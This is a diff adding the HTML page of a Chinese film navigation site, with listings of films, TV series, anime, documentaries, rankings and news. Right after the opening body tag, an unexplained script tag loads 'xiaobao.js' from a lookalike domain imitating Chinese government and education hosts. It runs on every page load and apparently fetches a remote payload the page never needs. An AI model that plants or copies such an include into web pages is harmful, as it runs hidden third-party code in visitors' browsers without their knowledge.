@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="影视网址——精选高分电影、热门电视剧、动漫番剧与纪录片导航，一站式发现好片。">
+<meta name="keywords" content="影视网址,电影推荐,电视剧,高分影片,在线观影导航">
+<meta name="author" content="影视网址">
+<meta name="robots" content="index,follow">
+<meta property="og:title" content="影视网址 | 精选影视导航">
+<meta property="og:description" content="精选高分电影、热门电视剧、动漫与纪录片，一站式影视发现平台。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://yingshiwangzhi-cn.github.io">
+<link rel="canonical" href="https://yingshiwangzhi-cn.github.io">
+<title>影视网址 | 精选电影·电视剧·动漫·纪录片导航</title>
+<style>
+:root{
+  --bg:#0b0f1a;--bg2:#121826;--card:#1a2033;--line:#2a3350;
+  --txt:#e8ecf5;--sub:#9aa6c4;--gold:#f5c451;--blue:#4a9eff;--red:#ff5a6e;--green:#39d98a;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;background:var(--bg);color:var(--txt);line-height:1.6;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+.container{max-width:1120px;margin:0 auto;padding:0 18px}
+
+/* ===== 顶部导航 ===== */
+.topbar{position:sticky;top:0;z-index:99;background:rgba(11,15,26,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.topbar .container{display:flex;align-items:center;gap:14px;height:60px}
+.logo{font-size:20px;font-weight:800;letter-spacing:.5px;color:var(--gold);white-space:nowrap}
+.logo span{color:var(--txt)}
+.nav{display:flex;gap:6px;flex:1;overflow-x:auto}
+.nav a{padding:7px 12px;border-radius:8px;font-size:14px;color:var(--sub);white-space:nowrap;transition:.2s}
+.nav a:hover{background:var(--card);color:var(--txt)}
+.nav a.active{background:var(--gold);color:#101522;font-weight:700}
+
+/* ===== Hero ===== */
+.hero{position:relative;padding:70px 0 60px;text-align:center;background:radial-gradient(1200px 400px at 50% -10%,rgba(74,158,255,.18),transparent),linear-gradient(180deg,var(--bg2),var(--bg))}
+.hero h1{font-size:clamp(28px,5vw,46px);font-weight:900;line-height:1.2;margin-bottom:14px}
+.hero h1 em{color:var(--gold);font-style:normal}
+.hero p{color:var(--sub);max-width:620px;margin:0 auto 26px;font-size:16px}
+.searchbox{display:flex;max-width:520px;margin:0 auto;background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden}
+.searchbox input{flex:1;background:transparent;border:none;color:var(--txt);padding:14px 16px;font-size:15px;outline:none}
+.searchbox button{background:var(--gold);border:none;padding:0 22px;font-weight:700;cursor:pointer;color:#101522}
+
+/* ===== 通用板块标题 ===== */
+.sec{padding:56px 0}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:26px;flex-wrap:wrap}
+.sec-head h2{font-size:24px;font-weight:800}
+.sec-head .tag{color:var(--gold);font-size:13px;border:1px solid var(--line);padding:3px 10px;border-radius:20px}
+
+/* ===== 栏目1 电影：横向卡片 + 评分徽章 ===== */
+.movie-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:18px}
+.movie{background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.25s;position:relative}
+.movie:hover{transform:translateY(-6px);border-color:var(--gold)}
+.movie .poster{aspect-ratio:2/3;background:linear-gradient(135deg,#232b45,#151a2b);display:flex;align-items:center;justify-content:center;font-size:34px}
+.movie .info{padding:12px}
+.movie .info b{font-size:15px;display:block;margin-bottom:4px}
+.movie .info small{color:var(--sub);font-size:12px}
+.movie .rate{position:absolute;top:10px;right:10px;background:rgba(245,196,81,.95);color:#201700;font-weight:800;font-size:12px;padding:3px 8px;border-radius:8px}
+
+/* ===== 栏目2 电视剧：列表行式（差异化 DOM）===== */
+.tv-list{display:flex;flex-direction:column;gap:12px}
+.tv-row{display:flex;gap:16px;align-items:center;background:linear-gradient(90deg,var(--card),transparent);border:1px solid var(--line);border-radius:12px;padding:12px 16px;transition:.2s}
+.tv-row:hover{background:var(--card);border-color:var(--blue)}
+.tv-row .idx{font-size:22px;font-weight:900;color:var(--blue);min-width:34px}
+.tv-row .txt{flex:1}
+.tv-row .txt b{display:block;font-size:16px}
+.tv-row .txt span{color:var(--sub);font-size:13px}
+.tv-row .badge{font-size:12px;color:var(--green);border:1px solid var(--green);padding:3px 10px;border-radius:20px}
+
+/* ===== 栏目3 动漫：圆形图标网格（差异化 DOM）===== */
+.ani-wrap{display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:22px;text-align:center}
+.ani .ico{width:86px;height:86px;margin:0 auto 12px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:36px;background:conic-gradient(from 0deg,#ff5a6e,#f5c451,#39d98a,#4a9eff,#ff5a6e)}
+.ani .ico i{background:var(--bg2);width:70px;height:70px;border-radius:50%;display:flex;align-items:center;justify-content:center}
+.ani b{font-size:14px}
+.ani small{color:var(--sub);font-size:12px;display:block;margin-top:3px}
+
+/* ===== 栏目4 纪录片：左右图文交错（差异化 DOM）===== */
+.doc{display:flex;flex-direction:column;gap:20px}
+.doc-item{display:flex;gap:20px;background:var(--card);border-left:4px solid var(--gold);border-radius:0 14px 14px 0;padding:18px;align-items:center}
+.doc-item:nth-child(even){flex-direction:row-reverse;border-left:none;border-right:4px solid var(--blue);border-radius:14px 0 0 14px;text-align:right}
+.doc-item .thumb{width:150px;height:100px;flex-shrink:0;border-radius:10px;background:linear-gradient(135deg,#2b3355,#191f33);display:flex;align-items:center;justify-content:center;font-size:34px}
+.doc-item .desc b{font-size:17px;display:block;margin-bottom:6px}
+.doc-item .desc p{color:var(--sub);font-size:14px}
+
+/* ===== 栏目5 排行：竖向进度条榜单（差异化 DOM）===== */
+.rank{background:var(--bg2);border:1px solid var(--line);border-radius:16px;padding:24px}
+.rank-item{display:grid;grid-template-columns:26px 1fr auto;align-items:center;gap:12px;margin-bottom:16px}
+.rank-item .no{font-weight:900;color:var(--sub)}
+.rank-item .no.top{color:var(--gold)}
+.rank-item .bar{height:12px;background:var(--card);border-radius:8px;overflow:hidden;grid-column:2;grid-row:2}
+.rank-item .bar i{display:block;height:100%;background:linear-gradient(90deg,var(--gold),var(--red));border-radius:8px}
+.rank-item .name{font-size:15px}
+.rank-item .score{font-size:13px;color:var(--gold);grid-column:3;grid-row:1}
+
+/* ===== 栏目6 资讯：卡片+日期角标（差异化 DOM）===== */
+.news{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:18px}
+.news-card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:20px;position:relative}
+.news-card .date{position:absolute;top:-12px;right:16px;background:var(--red);color:#fff;font-size:12px;font-weight:700;padding:5px 10px;border-radius:8px}
+.news-card h4{font-size:16px;margin-bottom:10px}
+.news-card p{color:var(--sub);font-size:13px}
+.news-card a{color:var(--blue);font-size:13px;font-weight:700}
+
+/* ===== 页脚 ===== */
+footer{background:var(--bg2);border-top:1px solid var(--line);padding:36px 0 24px;text-align:center}
+footer p{color:var(--sub);font-size:13px;margin:6px 0}
+footer .links{display:flex;gap:18px;justify-content:center;flex-wrap:wrap;margin-bottom:14px}
+footer .links a:hover{color:var(--gold)}
+
+/* ===== 移动端适配 ===== */
+@media(max-width:768px){
+  .topbar .container{height:auto;flex-wrap:wrap;padding:10px 18px}
+  .nav{order:3;flex-basis:100%;margin-top:8px}
+  .hero{padding:44px 0 40px}
+  .sec{padding:38px 0}
+  .sec-head h2{font-size:20px}
+  .doc-item,.doc-item:nth-child(even){flex-direction:column;text-align:left;border-radius:14px;border:1px solid var(--line);border-top:4px solid var(--gold)}
+  .doc-item .thumb{width:100%;height:140px}
+  .tv-row .idx{font-size:18px;min-width:26px}
+  .movie-grid{grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:12px}
+}
+@media(max-width:420px){
+  .logo{font-size:17px}
+  .movie-grid{grid-template-columns:repeat(2,1fr)}
+  .ani-wrap{grid-template-columns:repeat(3,1fr)}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- 顶部导航 -->
+<header class="topbar">
+  <div class="container">
+    <div class="logo">影视<span>网址</span></div>
+    <nav class="nav">
+      <a href="#home" class="active">首页</a>
+      <a href="#movies">电影</a>
+      <a href="#tv">电视剧</a>
+      <a href="#anime">动漫</a>
+      <a href="#doc">纪录片</a>
+      <a href="#rank">排行榜</a>
+      <a href="#news">影视资讯</a>
+    </nav>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="container">
+    <h1>发现好片，从这里开始<br><em>影视网址</em> · 精选影视导航</h1>
+    <p>聚合高分电影、热门电视剧、经典动漫与优质纪录片，帮你快速找到值得一看的影视作品。</p>
+    <div class="searchbox">
+      <input type="text" placeholder="搜索电影、剧集、演员或导演…" aria-label="搜索影视">
+      <button type="button">搜索</button>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目1 电影 -->
+<section class="sec" id="movies">
+  <div class="container">
+    <div class="sec-head"><h2>热门电影</h2><span class="tag">每周更新</span></div>
+    <div class="movie-grid">
+      <article class="movie"><div class="poster">🎬</div><span class="rate">9.4</span><div class="info"><b>肖申克的救赎</b><small>1994 · 剧情</small></div></article>
+      <article class="movie"><div class="poster">🎞️</div><span class="rate">9.2</span><div class="info"><b>阿甘正传</b><small>1994 · 励志</small></div></article>
+      <article class="movie"><div class="poster">🎭</div><span class="rate">9.0</span><div class="info"><b>霸王别姬</b><small>1993 · 剧情</small></div></article>
+      <article class="movie"><div class="poster">🚀</div><span class="rate">8.9</span><div class="info"><b>星际穿越</b><small>2014 · 科幻</small></div></article>
+      <article class="movie"><div class="poster">🕵️</div><span class="rate">9.1</span><div class="info"><b>盗梦空间</b><small>2010 · 悬疑</small></div></article>
+      <article class="movie"><div class="poster">🏴‍☠️</div><span class="rate">8.8</span><div class="info"><b>海上钢琴师</b><small>1998 · 音乐</small></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目2 电视剧 -->
+<section class="sec" id="tv" style="background:linear-gradient(180deg,var(--bg),var(--bg2))">
+  <div class="container">
+    <div class="sec-head"><h2>热播电视剧</h2><span class="tag">正在追</span></div>
+    <div class="tv-list">
+      <div class="tv-row"><span class="idx">01</span><div class="txt"><b>权力的游戏</b><span>史诗奇幻 · 8季 · HBO</span></div><span class="badge">已完结</span></div>
+      <div class="tv-row"><span class="idx">02</span><div class="txt"><b>绝命毒师</b><span>犯罪剧情 · 5季 · AMC</span></div><span class="badge">已完结</span></div>
+      <div class="tv-row"><span class="idx">03</span><div class="txt"><b>甄嬛传</b><span>古装宫斗 · 76集</span></div><span class="badge">经典</span></div>
+      <div class="tv-row"><span class="idx">04</span><div class="txt"><b>黑暗荣耀</b><span>复仇剧 · 2季 · Netflix</span></div><span class="badge">高分</span></div>
+      <div class="tv-row"><span class="idx">05</span><div class="txt"><b>隐秘的角落</b><span>悬疑 · 12集</span></div><span class="badge">口碑爆款</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目3 动漫 -->
+<section class="sec" id="anime">
+  <div class="container">
+    <div class="sec-head"><h2>动漫番剧</h2><span class="tag">追番推荐</span></div>
+    <div class="ani-wrap">
+      <div class="ani"><div class="ico"><i>🐉</i></div><b>进击的巨人</b><small>热血 / 悬疑</small></div>
+      <div class="ani"><div class="ico"><i>⚔️</i></div><b>鬼灭之刃</b><small>热血 / 奇幻</small></div>
+      <div class="ani"><div class="ico"><i>🌊</i></div><b>海贼王</b><small>冒险 / 长篇</small></div>
+      <div class="ani"><div class="ico"><i>🎴</i></div><b>咒术回战</b><small>热血 / 战斗</small></div>
+      <div class="ani"><div class="ico"><i>🌸</i></div><b>你的名字</b><small>治愈 / 爱情</small></div>
+      <div class="ani"><div class="ico"><i>🤖</i></div><b>新世纪福音战士</b><small>科幻 / 经典</small></div>
+      <div class="ani"><div class="ico"><i>🦊</i></div><b>间谍过家家</b><small>喜剧 / 日常</small></div>
+      <div class="ani"><div class="ico"><i>🗡️</i></div><b>葬送的芙莉莲</b><small>奇幻 / 治愈</small></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目4 纪录片 -->
+<section class="sec" id="doc" style="background:var(--bg2)">
+  <div class="container">
+    <div class="sec-head"><h2>优质纪录片</h2><span class="tag">开阔眼界</span></div>
+    <div class="doc">
+      <div class="doc-item">
+        <div class="thumb">🌍</div>
+        <div class="desc"><b>地球脉动</b><p>BBC 自然史诗，以震撼镜头展现地球多样生态与野生动物。</p></div>
+      </div>
+      <div class="doc-item">
+        <div class="thumb">🧬</div>
+        <div class="desc"><b>人类星球</b><p>探索人类如何在不同极端环境中生存与繁衍。</p></div>
+      </div>
+      <div class="doc-item">
+        <div class="thumb">🚀</div>
+        <div class="desc"><b>宇宙的构造</b><p>深入浅出解读相对论、量子力学与时空本质。</p></div>
+      </div>
+      <div class="doc-item">
+        <div class="thumb">🎨</div>
+        <div class="desc"><b>我在故宫修文物</b><p>记录文物修复师的日常，感受匠人精神与历史温度。</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目5 排行榜 -->
+<section class="sec" id="rank">
+  <div class="container">
+    <div class="sec-head"><h2>影视排行榜</h2><span class="tag">Top 榜</span></div>
+    <div class="rank">
+      <div class="rank-item"><span class="no top">1</span><span class="name">肖申克的救赎</span><span class="score">9.7</span><div class="bar"><i style="width:97%"></i></div></div>
+      <div class="rank-item"><span class="no top">2</span><span class="name">霸王别姬</span><span class="score">9.6</span><div class="bar"><i style="width:96%"></i></div></div>
+      <div class="rank-item"><span class="no top">3</span><span class="name">阿甘正传</span><span class="score">9.5</span><div class="bar"><i style="width:95%"></i></div></div>
+      <div class="rank-item"><span class="no">4</span><span class="name">泰坦尼克号</span><span class="score">9.4</span><div class="bar"><i style="width:94%"></i></div></div>
+      <div class="rank-item"><span class="no">5</span><span class="name">千与千寻</span><span class="score">9.3</span><div class="bar"><i style="width:93%"></i></div></div>
+      <div class="rank-item"><span class="no">6</span><span class="name">盗梦空间</span><span class="score">9.2</span><div class="bar"><i style="width:92%"></i></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目6 资讯 -->
+<section class="sec" id="news" style="background:var(--bg2)">
+  <div class="container">
+    <div class="sec-head"><h2>影视资讯</h2><span class="tag">最新动态</span></div>
+    <div class="news">
+      <article class="news-card"><span class="date">10-24</span><h4>2026 金鸡奖提名名单公布</h4><p>第39届中国电影金鸡奖提名揭晓，多部现实题材影片入围最佳故事片。</p><a href="#news">阅读更多 →</a></article>
+      <article class="news-card"><span class="date">10-22</span><h4>诺兰新片定档 2027</h4><p>克里斯托弗·诺兰执导新作正式官宣档期，或将再度挑战实拍大场面。</p><a href="#news">阅读更多 →</a></article>
+      <article class="news-card"><span class="date">10-20</span><h4>国庆档票房盘点</h4><p>回顾今年国庆档整体表现，头部影片拉动市场回暖。</p><a href="#news">阅读更多 →</a></article>
+      <article class="news-card"><span class="date">10-18</span><h4>经典老片 4K 修复重映</h4><p>多部影史经典启动 4K 修复计划，将陆续登陆全国院线。</p><a href="#news">阅读更多 →</a></article>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer>
+  <div class="container">
+    <div class="links">
+      <a href="#home">首页</a>
+      <a href="#movies">电影</a>
+      <a href="#tv">电视剧</a>
+      <a href="#anime">动漫</a>
+      <a href="#doc">纪录片</a>
+      <a href="#rank">排行榜</a>
+      <a href="#news">资讯</a>
+    </div>
+    <p>© 2026 影视网址 · 精选影视导航平台</p>
+    <p>网址：<a href="https://yingshiwangzhi-cn.github.io" style="color:var(--gold)">https://yingshiwangzhi-cn.github.io</a></p>
+    <p>本站为影视信息导航，不提供任何资源下载与在线播放。</p>
+  </div>
+</footer>
+
+<script>
+// 导航高亮当前栏目
+const links=[...document.querySelectorAll('.nav a')];
+const map={home:'home',movies:'movies',tv:'tv',anime:'anime',doc:'doc',rank:'rank',news:'news'};
+window.addEventListener('scroll',()=>{
+  let cur='home';
+  document.querySelectorAll('section').forEach(s=>{if(window.scrollY>=s.offsetTop-120)cur=s.id;});
+  links.forEach(l=>l.classList.toggle('active',l.getAttribute('href')==='#'+cur));
+});
+</script>
+</body>
+</html>
